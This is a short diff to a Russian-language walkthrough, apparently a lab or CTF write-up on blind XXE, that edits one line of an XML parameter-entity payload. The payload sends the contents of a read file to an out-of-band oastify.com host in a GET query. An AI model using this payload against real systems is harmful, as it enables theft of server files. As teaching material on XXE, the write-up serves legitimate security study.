@@ -102,7 +102,7 @@ Content-Length: 47
 - Добавлю параметрическую сущность, которая будет подставлять `file` в параметры `GET`-запроса в сущности `send`:
 
 ```xml
-<!ENTITY % cmd "<!ENTITY &#x25; send SYSTEM 'https://9jtx9441icyck5axq2c29etl7cd31upj.oastify.com/?x=%file;'>">
+<!ENTITY % send "<!ENTITY &#x25; cmd SYSTEM 'https://9jtx9441icyck5axq2c29etl7cd31upj.oastify.com/?x=%file;'>">
 ```
 
 - Соберу все вместе:
